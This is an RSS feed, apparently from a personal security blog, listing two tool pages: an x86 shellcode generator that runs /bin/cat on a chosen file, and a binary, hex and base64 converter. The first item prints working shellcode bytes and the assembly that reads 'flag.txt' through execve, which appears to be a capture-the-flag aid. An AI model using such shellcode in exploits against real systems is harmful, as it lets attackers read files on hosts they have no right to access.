<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Tools on Master 0xCcC</title>
    <link>https://masterccc.github.io/tools/</link>
    <description>Recent content in Tools on Master 0xCcC</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 03 Oct 2019 15:41:06 +0200</lastBuildDate>
    
	<atom:link href="https://masterccc.github.io/tools/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>/bin/cat Shellcode generator</title>
      <link>https://masterccc.github.io/tools/shellcode_gen/</link>
      <pubDate>Thu, 03 Oct 2019 15:41:06 +0200</pubDate>
      
      <guid>https://masterccc.github.io/tools/shellcode_gen/</guid>
      <description>/bin/cat [your_file] Shellcode generator for intel x86 File name to read : Generate This is your shellcode : \x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80    bits 32 global main SECTION .text main: xor eax,eax ; set eax to 0 push eax ; end of string push 0x7461632f ;&#34;tac/&#34; push 0x6e69622f ;&#34;inb/&#34; mov ebx,esp push eax ; end of string  push 0x7478742e push 0x67616c66   mov ecx,esp push eax ; null push ecx ; file push ebx ; /bin/cat mov ecx,esp ; {/bin/cat,file,null} xor eax,eax add eax,0xb int 0x80   var begin = &#34;</description>
    </item>
    
    <item>
      <title>Bin/asci/hex/b64 converter</title>
      <link>https://masterccc.github.io/tools/convert/</link>
      <pubDate>Sat, 27 Jul 2019 15:41:06 +0200</pubDate>
      
      <guid>https://masterccc.github.io/tools/convert/</guid>
      <description> SÃ©parateur None Espace Virgule Autre  0x/0b prefix ASCII text  Base64  Base 16  Base 10  Base 2  Length (bytes)    var ld = document ; function _c8(){var e=ld._fm_._rm_.selectedIndex,c=&#34;&#34;;1==e&amp;&amp;(c=&#34; &#34;),2==e&amp;&amp;(c=&#34;,&#34;),3==e&amp;&amp;(c=&#34;,0x&#34;),4==e&amp;&amp;(c=&#34;,0b&#34;),ld._fm_.del.value=c,ld._fm_.del.readOnly=!0,5==e&amp;&amp;(ld._fm_.del.focus(),ld._fm_.del.readOnly=!1),_c0()}function _c9(){ld._fm_._rm_.selectedIndex=5,_c0()}function _cls(){ld._fm_.del.value=&#34;&#34;,ld._fm_._rm_.selectedIndex=0,_c0()}function _x(e,c){var t,n,o,a=hex=dec=bin=&#34;&#34;,l=ld._fm_.del.value,r=&#34;&#34;,d=&#34;&#34;;ld.querySelector(&#34;#prefix&#34;).checked&amp;&amp;(r=&#34;0x&#34;,d=&#34;0b&#34;);for(var m=0;m</description>
    </item>
    
  </channel>
</rss>